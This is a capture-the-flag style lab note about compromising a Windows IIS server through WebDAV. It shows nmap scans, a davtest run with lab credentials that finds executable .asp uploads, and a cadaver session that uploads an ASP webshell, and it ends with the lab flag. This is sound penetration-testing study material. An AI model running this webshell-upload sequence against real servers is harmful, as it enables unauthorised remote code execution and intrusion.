---
up: "[[Exploiting Windows Vulnerabilities]]"
---

# ðŸ§ª Windows ISS Server - DAVTest

> [!NOTE] Title
> Target is 10.4.24.143

Quick scan:

```bash
# nmap $TRG
Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-04 22:17 IST
Nmap scan report for 10.4.24.143
Host is up (0.0096s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
```

```bash
# nmap -sV -p 80 --script http-enum $TRG
Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-04 22:26 IST
Nmap scan report for 10.4.24.143
Host is up (0.0092s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.73 seconds
```

```bash
# davtest -auth bob:password_123321 -url http://$TRG/webdav
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.4.24.143/webdav
********************************************************
NOTE	Random string for this session: VlkxAKewPoM
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM
********************************************************
 Sending test files
PUT	jsp	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.jsp
PUT	shtml	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.shtml
PUT	cfm	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.cfm
PUT	cgi	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.cgi
PUT	html	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.html
PUT	jhtml	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.jhtml
PUT	pl	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.pl
PUT	txt	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.txt
PUT	php	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.php
PUT	aspx	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.aspx
PUT	asp	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.asp
********************************************************
 Checking for test file execution
EXEC	jsp	FAIL
EXEC	shtml	FAIL
EXEC	cfm	FAIL
EXEC	cgi	FAIL
EXEC	html	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.html
EXEC	jhtml	FAIL
EXEC	pl	FAIL
EXEC	txt	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.txt
EXEC	php	FAIL
EXEC	aspx	FAIL
EXEC	asp	SUCCEED:	http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.asp

********************************************************
/usr/bin/davtest Summary:
Created: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.jsp
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.shtml
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.cfm
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.cgi
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.html
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.jhtml
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.pl
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.txt
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.php
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.aspx
PUT File: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.asp
Executes: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.html
Executes: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.txt
Executes: http://10.4.24.143/webdav/DavTestDir_VlkxAKewPoM/davtest_VlkxAKewPoM.asp
```

```bash
# cadaver http://$TRG/webdav
Authentication required for 10.4.24.143 on server `10.4.24.143':
Username: bob
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_VlkxAKewPoM                 0  Feb  4 22:31
        AttackDefense.txt                     13  Jan  2  2021
        web.config                           168  Jan  2  2021
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
```

![[Pasted image 20240204180729.png]]

![[Pasted image 20240204180759.png]]

![[Pasted image 20240204180917.png]]

![[Pasted image 20240204181152.png]]

![[Pasted image 20240204181244.png]]

Flag is `0cc175b9c0f1b6a831c399e269772661`
